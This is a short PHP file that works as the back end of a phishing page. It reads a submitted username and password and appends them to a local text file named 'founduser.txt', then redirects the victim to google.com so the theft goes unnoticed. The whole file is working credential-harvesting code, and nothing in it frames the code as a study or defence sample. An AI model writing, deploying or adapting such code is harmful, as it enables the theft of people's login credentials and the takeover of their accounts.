<?php
$email = $_POST["username"];
$pass = $_POST["password"];

 $co = "===========================================\n";
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $email\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
header('Location: https://google.com');
exit();
?>
